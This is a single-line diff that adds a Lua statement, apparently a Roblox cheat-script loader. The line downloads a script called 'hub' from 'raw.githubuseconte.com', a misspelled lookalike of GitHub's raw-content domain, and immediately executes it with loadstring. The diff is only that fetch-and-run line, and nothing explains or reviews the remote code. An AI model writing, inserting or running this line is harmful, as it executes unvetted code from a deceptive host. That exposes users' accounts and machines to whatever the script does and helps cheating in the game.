@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubuseconte.com/BadScripters/CloudHub/main/hub"))()
